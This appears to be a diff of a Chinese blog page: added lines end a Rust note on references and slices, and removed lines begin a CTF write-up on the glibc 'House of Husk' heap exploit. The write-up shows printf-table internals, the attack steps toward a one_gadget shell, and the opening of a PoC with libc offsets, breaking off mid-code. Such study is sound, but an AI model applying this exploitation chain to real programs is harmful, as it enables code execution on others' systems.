+<h2 id="专有词语详解"><a href="#专有词语详解" class="headerlink" title="专有词语详解"></a>专有词语详解</h2><h3 id="引用-reference"><a href="#引用-reference" class="headerlink" title="引用 reference"></a>引用 reference</h3><p>指向某个值的借用，不拥有该值。</p>
+<p><code>&amp;name</code> 是不可变引用。</p>
+<h3 id="可变引用-mutable-reference"><a href="#可变引用-mutable-reference" class="headerlink" title="可变引用 mutable reference"></a>可变引用 mutable reference</h3><p>可以修改借来的值。</p>
+<p><code>&amp;mut text</code> 必须配合可变变量使用。</p>
+<h3 id="切片-slice"><a href="#切片-slice" class="headerlink" title="切片 slice"></a>切片 slice</h3><p>引用集合中连续的一部分。</p>
+<p><code>&amp;numbers[1..4]</code> 借用索引 1 到 3。</p>
+<h3 id="字符串切片-str"><a href="#字符串切片-str" class="headerlink" title="字符串切片 &amp;str"></a>字符串切片 &amp;str</h3><p>指向 UTF-8 字符串内容的一段视图。</p>
+<p>字符串字面量的类型就是 <code>&amp;str</code>。</p>
+<h3 id="范围-range"><a href="#范围-range" class="headerlink" title="范围 range"></a>范围 range</h3><p><code>start..end</code> 表示左闭右开区间。</p>
+<p><code>0..5</code> 包含 0，不包含 5。</p>
+<h2 id="初学者拓展"><a href="#初学者拓展" class="headerlink" title="初学者拓展"></a>初学者拓展</h2><p>引用本身也有类型。<code>&amp;String</code> 是借用一个 String，<code>&amp;str</code> 是借用字符串内容的一段。</p>
+<p>字符串切片索引按字节计算，不按人眼看到的字符计算。切到 UTF-8 字符中间会 panic。</p>
+<p>切片常用于函数参数，因为它既避免复制，又能接受数组、Vec 或字符串的一部分。</p>
+<p>当函数只读一段集合时，优先考虑 <code>&amp;[T]</code>。当函数只读字符串时，优先考虑 <code>&amp;str</code>。</p>
+<h2 id="常见误区"><a href="#常见误区" class="headerlink" title="常见误区"></a>常见误区</h2><ul>
+<li>不要把切片当作拥有数据的新集合。它只是借用视图。</li>
+<li>不要随便用字节索引切中文字符串。中文字符通常占多个字节。</li>
+<li><code>&amp;mut</code> 借用期间不要再创建其他引用。</li>
+<li>函数参数写 <code>&amp;String</code> 通常不如 <code>&amp;str</code> 灵活。</li>
+</ul>
+<h2 id="进阶练习与参考答案"><a href="#进阶练习与参考答案" class="headerlink" title="进阶练习与参考答案"></a>进阶练习与参考答案</h2><h3 id="练习-1：提取首词"><a href="#练习-1：提取首词" class="headerlink" title="练习 1：提取首词"></a>练习 1：提取首词</h3><p>要求：写函数返回英文句子的第一个单词。</p>
+<p>参考答案：</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">first_word</span>(text: &amp;<span class="type">str</span>) <span class="punctuation">-&gt;</span> &amp;<span class="type">str</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (index, byte) <span class="keyword">in</span> text.<span class="title function_ invoke__">bytes</span>().<span class="title function_ invoke__">enumerate</span>() &#123;</span><br><span class="line">        <span class="keyword">if</span> byte == <span class="string">b&#x27; &#x27;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> &amp;text[..index];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    text</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, <span class="title function_ invoke__">first_word</span>(<span class="string">&quot;Rust language&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>解释：返回值 <code>&amp;str</code> 借用输入字符串的一部分，没有复制内容。</p>
+<h3 id="练习-2：数组切片求和"><a href="#练习-2：数组切片求和" class="headerlink" title="练习 2：数组切片求和"></a>练习 2：数组切片求和</h3><p>要求：写函数接收 <code>&amp;[i32]</code> 并求和。</p>
+<p>参考答案：</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">sum</span>(values: &amp;[<span class="type">i32</span>]) <span class="punctuation">-&gt;</span> <span class="type">i32</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">total</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> <span class="variable">value</span> <span class="keyword">in</span> values &#123;</span><br><span class="line">        total += value;</span><br><span class="line">    &#125;</span><br><span class="line">    total</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">numbers</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, <span class="title function_ invoke__">sum</span>(&amp;numbers[<span class="number">1</span>..<span class="number">4</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>解释：<code>&amp;[i32]</code> 可以接收数组或 Vec 的连续片段。</p>
+<h3 id="练习-3：缩小可变借用"><a href="#练习-3：缩小可变借用" class="headerlink" title="练习 3：缩小可变借用"></a>练习 3：缩小可变借用</h3><p>要求：先修改字符串，再打印原字符串。</p>
+<p>参考答案：</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">text</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;Rust&quot;</span>);</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">borrowed</span> = &amp;<span class="keyword">mut</span> text;</span><br><span class="line">        borrowed.<span class="title function_ invoke__">push_str</span>(<span class="string">&quot; slice&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;text&#125;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>解释：可变引用离开内部作用域后，原变量可以再次使用。</p>
+<h2 id="相关笔记"><a href="#相关笔记" class="headerlink" title="相关笔记"></a>相关笔记</h2><ul>
+<li><a href="https://kylinxin.github.io/2026/04/05/Rust%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-05-%E6%89%80%E6%9C%89%E6%9D%83%E4%B8%8E%E5%80%9F%E7%94%A8/">Rust学习笔记 05：所有权与借用</a></li>
+<li><a href="https://kylinxin.github.io/2026/04/07/Rust%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-07-%E7%BB%93%E6%9E%84%E4%BD%93%E5%92%8C%E6%96%B9%E6%B3%95/">Rust学习笔记 07：结构体和方法</a></li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+        
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="https://kylinxin.github.io/2026/04/05/Rust%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-05-%E6%89%80%E6%9C%89%E6%9D%83%E4%B8%8E%E5%80%9F%E7%94%A8/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1385,348 +1771,6 @@
 
 
 
-        
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://kylinxin.github.io/2023/11/12/House%20Of%20Husk%20%E6%90%AD%E9%85%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%A0%86%E5%88%A9%E7%94%A8%E5%85%A8%E6%96%B0%E7%90%86%E8%A7%A3/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/faction/1.png">
-      <meta itemprop="name" content="Kylinxin">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Kylinxin's Blog">
-      <meta itemprop="description" content="Kylinxin's Blog">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Kylinxin's Blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2023/11/12/House%20Of%20Husk%20%E6%90%AD%E9%85%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%A0%86%E5%88%A9%E7%94%A8%E5%85%A8%E6%96%B0%E7%90%86%E8%A7%A3/" class="post-title-link" itemprop="url">House Of Husk 搭配格式化字符串的堆利用全新理解</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2023-11-12 15:14:29" itemprop="dateCreated datePublished" datetime="2023-11-12T15:14:29+08:00">2023-11-12</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/heap/" itemprop="url" rel="index"><span itemprop="name">heap</span></a>
-        </span>
-    </span>
-
-  
-    <span class="post-meta-break"></span>
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>8.6k</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>31 分钟</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="House-Of-Husk"><a href="#House-Of-Husk" class="headerlink" title="House Of Husk"></a>House Of Husk</h1><p>前言：在打PolarCTF2023 冬季个人挑战赛时遇到一个堆题，题目叫做easy_str，一开始以为是个格式化字符串题目，但实际上是个堆题，题目也很特殊，只能申请大小大于0x500的chunk，特此赛后复盘学习以下该题目，以及这个题目所用到的技巧</p>
-<h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a><strong>攻击原理</strong></h2><p>这种攻击方式主要是利用了<code>printf</code>的一个调用链，应用场景是只能分配较大chunk时(超过fastbin)，存在或可以构造出UAF漏洞。</p>
-<p>首先从源码角度简单分析攻击背后的原理。在使用<code>printf</code>类格式化字符串函数进行输出的时候，该类函数会根据我们格式化字符串的种类不同而采取不同的输出格式进行输出，在glibc中有这样一个函数<code>__register_printf_function</code>，为格式化字符为<code>spec</code>的格式化输出注册函数，这个函数是<code>__register_printf_specifier</code>函数的封装。</p>
-<p>跟进__register_printf_specifier函数，如果格式化符超过0xff或小于0，即不在ascii码则返回-1，如果__printf_arginfo_table为空就通过calloc分配堆内存存放__printf_arginfo_table以及__printf_function_table。两个表空间都为0x100，可以为0-0xff的每个字符注册一个函数指针，第一个表后面紧接着第二个表。</p>
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Register FUNC to be called to format SPEC specifiers.  */</span><br><span class="hljs-type">int</span><br>__register_printf_function (<span class="hljs-type">int</span> spec, printf_function converter,<br>                printf_arginfo_function arginfo)<br>&#123;<br><span class="hljs-keyword">return</span> __register_printf_specifier (spec, converter,<br>                      (printf_arginfo_size_function*) arginfo);<br>&#125;<br><span class="hljs-comment">/* Register FUNC to be called to format SPEC specifiers.  */</span><br><span class="hljs-type">int</span><br>__register_printf_specifier (<span class="hljs-type">int</span> spec, printf_function converter,<br>                 printf_arginfo_size_function arginfo)<br>&#123;<br><span class="hljs-keyword">if</span> (spec &lt; <span class="hljs-number">0</span> || spec &gt; (<span class="hljs-type">int</span>) UCHAR_MAX)<br>    &#123;<br>      __set_errno (EINVAL);<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>  <span class="hljs-type">int</span> result = <span class="hljs-number">0</span>;<br>  __libc_lock_lock (lock);<br><br><span class="hljs-keyword">if</span> (__printf_function_table == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      __printf_arginfo_table = (printf_arginfo_size_function **)<br>    <span class="hljs-built_in">calloc</span> (UCHAR_MAX + <span class="hljs-number">1</span>,<span class="hljs-keyword">sizeof</span> (<span class="hljs-type">void</span> *) * <span class="hljs-number">2</span>);<br><span class="hljs-keyword">if</span> (__printf_arginfo_table == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      result = <span class="hljs-number">-1</span>;<br><span class="hljs-keyword">goto</span> out;<br>    &#125;<br><br>      __printf_function_table = (printf_function **)<br>    (__printf_arginfo_table + UCHAR_MAX + <span class="hljs-number">1</span>);<br>    &#125;<br><br>  __printf_function_table[spec] = converter;<br>  __printf_arginfo_table[spec] = arginfo;<br><br> out:<br>  __libc_lock_unlock (lock);<br><br><span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></tbody></table></figure>
-
-<p><code>__printf_function_table</code>spec索引处的类型为<code>printf_function</code>的函数指针是我们为chr(spec)这个格式化字符注册的输出函数的函数指针，这个函数在<code>printf-&gt;vfprintf-&gt;printf_positional</code>中被调用。</p>
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Type of a printf specifier-handler function.</span><br><span class="hljs-comment">   STREAM is the FILE on which to write output.</span><br><span class="hljs-comment">   INFO gives information about the format specification.</span><br><span class="hljs-comment">   ARGS is a vector of pointers to the argument data;</span><br><span class="hljs-comment">   the number of pointers will be the number returned</span><br><span class="hljs-comment">   by the associated arginfo function for the same INFO.</span><br><span class="hljs-comment">   The function should return the number of characters written,</span><br><span class="hljs-comment">   or -1 for errors.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">intprintf_function</span> <span class="hljs-params">(FILE *__stream,</span><br><span class="hljs-params">                             conststruct printf_info *__info,</span><br><span class="hljs-params">                             <span class="hljs-type">const</span> <span class="hljs-type">void</span> *<span class="hljs-type">const</span> *__args)</span>;<br><br><span class="hljs-comment">//glibc-2.27/vfprintf.c:1985</span><br><span class="hljs-keyword">extern</span> printf_function **__printf_function_table;<br>      <span class="hljs-type">int</span> function_done;<br><br><span class="hljs-keyword">if</span> (spec &lt;= UCHAR_MAX<br>          &amp;&amp; __printf_function_table != <span class="hljs-literal">NULL</span><br>          &amp;&amp; __printf_function_table[(<span class="hljs-type">size_t</span>) spec] != <span class="hljs-literal">NULL</span>)<br>        &#123;<br>          <span class="hljs-type">const</span> <span class="hljs-type">void</span> **ptr = alloca (specs[nspecs_done].ndata_args<br>                     *<span class="hljs-keyword">sizeof</span> (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *));<br><br>          <span class="hljs-comment">/* Fill in an array of pointers to the argument values.  */</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; specs[nspecs_done].ndata_args;<br>           ++i)<br>        ptr[i] = &amp;args_value[specs[nspecs_done].data_arg + i];<br><br>          <span class="hljs-comment">/* Call the function.  */</span><br>          function_done = __printf_function_table[(<span class="hljs-type">size_t</span>) spec]<br>        (s, &amp;specs[nspecs_done].info, ptr);<br><br><span class="hljs-keyword">if</span> (function_done != <span class="hljs-number">-2</span>)<br>        &#123;<br>          <span class="hljs-comment">/* If an error occurred we don't have information</span><br><span class="hljs-comment">             about # of chars.  */</span><br><span class="hljs-keyword">if</span> (function_done &lt; <span class="hljs-number">0</span>)<br>            &#123;<br>              <span class="hljs-comment">/* Function has set errno.  */</span><br>              done = <span class="hljs-number">-1</span>;<br><span class="hljs-keyword">goto</span> all_done;<br>            &#125;<br><br>          done_add (function_done);<br><span class="hljs-keyword">break</span>;<br>        &#125;<br>        &#125;<br></code></pre></td></tr></tbody></table></figure>
-
-<p><code>__printf_arginfo_table</code>spec索引处的类型为<code>printf_arginfo_size_function</code>的函数指针是我们为chr(spec)这个格式化字符注册的输出函数的另一个函数指针，这个函数在<code>printf-&gt;vfprintf-&gt;printf_positional-&gt;__parse_one_specmb</code>中被调用。可以看到其返回值为格式化字符消耗的参数个数，猜测其功能是根据格式化字符做解析。</p>
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Type of a printf specifier-arginfo function.</span><br><span class="hljs-comment">   INFO gives information about the format specification.</span><br><span class="hljs-comment">   N, ARGTYPES, *SIZE has to contain the size of the parameter for</span><br><span class="hljs-comment">   user-defined types, and return value are as for parse_printf_format</span><br><span class="hljs-comment">   except that -1 should be returned if the handler cannot handle</span><br><span class="hljs-comment">   this case.  This allows to partially overwrite the functionality</span><br><span class="hljs-comment">   of existing format specifiers.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">intprintf_arginfo_size_function</span> <span class="hljs-params">(conststruct printf_info *__info,</span><br><span class="hljs-params">                                          <span class="hljs-type">size_t</span> __n, <span class="hljs-type">int</span> *__argtypes,</span><br><span class="hljs-params">                                          <span class="hljs-type">int</span> *__size)</span>;<br><br><span class="hljs-comment">//glibc-2.27/printf-parsemb.c:307</span><br><br><span class="hljs-comment">/* Get the format specification.  */</span><br>  spec-&gt;info.spec = (<span class="hljs-type">wchar_t</span>) *format++;<br>  spec-&gt;size = <span class="hljs-number">-1</span>;<br><span class="hljs-keyword">if</span> (__builtin_expect (__printf_function_table == <span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>)<br>      || spec-&gt;info.spec &gt; UCHAR_MAX<br>      || __printf_arginfo_table[spec-&gt;info.spec] == <span class="hljs-literal">NULL</span><br>      <span class="hljs-comment">/* We don't try to get the types for all arguments if the format</span><br><span class="hljs-comment">     uses more than one.  The normal case is covered though.  If</span><br><span class="hljs-comment">     the call returns -1 we continue with the normal specifiers.  */</span><br>      || (<span class="hljs-type">int</span>) (spec-&gt;ndata_args = (*__printf_arginfo_table[spec-&gt;info.spec])<br>                   (&amp;spec-&gt;info, <span class="hljs-number">1</span>, &amp;spec-&gt;data_arg_type,<br>                    &amp;spec-&gt;size)) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-comment">/* Find the data argument types of a built-in spec.  */</span><br>      spec-&gt;ndata_args = <span class="hljs-number">1</span>;<br><br>structprintf_spec<br>  &#123;<br>    <span class="hljs-comment">/* Information parsed from the format spec.  */</span><br>structprintf_infoinfo;<br>    <span class="hljs-comment">/* Pointers into the format string for the end of this format</span><br><span class="hljs-comment">       spec and the next (or to the end of the string if no more).  */</span><br>    <span class="hljs-type">const</span> UCHAR_T *end_of_fmt, *next_fmt;<br>    <span class="hljs-comment">/* Position of arguments for precision and width, or -1 if `info' has</span><br><span class="hljs-comment">       the constant value.  */</span><br>    <span class="hljs-type">int</span> prec_arg, width_arg;<br>    <span class="hljs-type">int</span> data_arg;                <span class="hljs-comment">/* Position of data argument.  */</span><br>    <span class="hljs-type">int</span> data_arg_type;                <span class="hljs-comment">/* Type of first argument.  */</span><br>    <span class="hljs-comment">/* Number of arguments consumed by this format specifier.  */</span><br>    <span class="hljs-type">size_t</span> ndata_args;<br>    <span class="hljs-comment">/* Size of the parameter for PA_USER type.  */</span><br>    <span class="hljs-type">int</span> size;<br>  &#125;;<br></code></pre></td></tr></tbody></table></figure>
-
-<p>此外，在vfprintf函数中如果检测到我们注册的table不为空，则对于格式化字符不走默认的输出函数而是调用<code>printf_positional</code>函数，进而可以调用到表中的函数指针。</p>
-<p>至此，两个调用链的分析就完成了，我们再来结合poc分析一下今天要谈论的攻击方式是如何和printf结合的。</p>
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.27/vfprintf.c:1335</span><br><span class="hljs-comment">/* Use the slow path in case any printf handler is registered.  */</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely (__printf_function_table != <span class="hljs-literal">NULL</span><br>            || __printf_modifier_table != <span class="hljs-literal">NULL</span><br>            || __printf_va_arg_table != <span class="hljs-literal">NULL</span>))<br><span class="hljs-keyword">goto</span> do_positional;<br><br>  <span class="hljs-comment">/* Hand off processing for positional parameters.  */</span><br><br>do_positional:<br><span class="hljs-keyword">if</span> (__glibc_unlikely (workstart != <span class="hljs-literal">NULL</span>))<br>    &#123;<br>      <span class="hljs-built_in">free</span> (workstart);<br>      workstart = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>  done = printf_positional (s, format, readonly_format, ap, &amp;ap_save,<br>                done, nspecs_done, lead_str_end, work_buffer,<br>                save_errno, grouping, thousands_sep);<br></code></pre></td></tr></tbody></table></figure>
-
-<h2 id="poc分析"><a href="#poc分析" class="headerlink" title="poc分析"></a><strong>poc分析</strong></h2><p>这里使用的poc就直接用攻击发现者提供的源代码，运行环境为<code>ubuntu 18.04/glibc 2.27</code>，编译命令为<code>gcc ./poc.c -g -fPIE -no-pie -o poc</code>(关闭pie方便调试)。</p>
-<p>代码模拟了UAF漏洞，先分配一个超过fastbin的块，释放之后会进入<code>unsorted bin</code>。预先分配两个chunk，第一个用来伪造<code>__printf_function_table</code>，第二个用来伪造<code>__printf_arginfo_table</code>。将<code>__printf_arginfo_table['X']</code>处的函数指针改为<code>one_gadget</code>。</p>
-<p>使用<code>unsorted bin attack</code>改写<code>global_max_fast</code>为<code>main_arena+88</code>从而使得释放的所有块都按fastbin处理(都是超过large bin大小的堆块不会进tcache)。</p>
-<p>在这里有一个很重要的知识就是fastbin的堆块地址会存放在main_arena中，从<code>main_arena+8</code>开始存放<code>fastbin[0x20]</code>的头指针，一直往后推，由于平时的fastbin默认阈值为<code>0x80</code>，所以在glibc-2.23的环境下最多存放到main_arena+0x48，现在我们将阈值改为<code>0x7f*</code>导致几乎所有sz的chunk都被当做fastbin，其地址会从main_arena+8开始，根据sz不同往libc覆写堆地址。如此一来，只要我们计算好<code>__printf_arginfo_table</code>和<code>main_arena</code>的地址偏移，进而得到合适的<code>sz</code>，就可以在之后释放这个伪造table的chunk时覆写<code>__printf_arginfo_table</code>为<code>heap_addr</code>。这种利用方式在<code>*CTF2019-&gt;heap_master</code>的题解中我曾经使用过，详情可以参见<a target="_blank" rel="noopener" href="https://ama2in9.top/2020/01/02/heap_master/">Star CTF heap_master的1.2.4.3</a>。</p>
-<p>有了上述知识铺垫，整个攻击流程就比较清晰了，总结一下，先UAF改global_max_fast为main_arena+88，之后释放合适sz的块到fastbin，从而覆写<code>__printf_arginfo_table</code>表为heap地址，<code>heap['X']</code>被覆写为了one_gadget，在调用这个函数指针时即可get shell。</p>
-<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * This is a Proof-of-Concept for House of Husk</span><br><span class="hljs-comment"> * This PoC is supposed to be run with libc-2.27.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span>#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span>#<span class="hljs-keyword">define</span> offset2size(ofs) ((ofs) * 2 - 0x10)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAIN_ARENA       0x3ebc40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAIN_ARENA_DELTA 0x60</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GLOBAL_MAX_FAST  0x3ed940</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRINTF_FUNCTABLE 0x3f0658</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRINTF_ARGINFO   0x3ec870</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ONE_GADGET       0x10a38c</span><br><br>intmain (<span class="hljs-type">void</span>)<br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> libc_base;<br>  <span class="hljs-type">char</span> 